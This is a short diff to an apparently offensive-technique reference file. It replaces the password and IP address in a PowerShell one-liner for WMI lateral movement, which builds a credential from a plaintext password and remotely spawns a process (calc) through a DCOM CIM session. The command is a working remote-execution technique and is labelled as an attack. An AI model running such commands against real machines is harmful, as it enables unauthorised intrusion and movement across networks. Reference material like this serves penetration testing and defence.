@@ -40,8 +40,8 @@
       ],
       "examples": [
         {
-          "command": "$u='jen';$p='Nexus123!';$s=ConvertTo-SecureString $p -AsPlaintext -Force;$c=New-Object System.Management.Automation.PSCredential $u,$s;$o=New-CimSessionOption -Protocol DCOM;$ses=New-Cimsession -ComputerName 192.168.50.73 -Credential $c -SessionOption $o;Invoke-CimMethod -CimSession $ses -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'}",
-          "description": "Complete WMI lateral movement one-liner: Create credentials, establish session, spawn calculator on 192.168.50.73",
+          "command": "$u='jen';$p='SecureP@ss123!';$s=ConvertTo-SecureString $p -AsPlaintext -Force;$c=New-Object System.Management.Automation.PSCredential $u,$s;$o=New-CimSessionOption -Protocol DCOM;$ses=New-Cimsession -ComputerName 10.10.10.73 -Credential $c -SessionOption $o;Invoke-CimMethod -CimSession $ses -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'}",
+          "description": "Complete WMI lateral movement one-liner: Create credentials, establish session, spawn calculator on 10.10.10.73",
           "context": "Full WMI attack from single command"
         },
         {
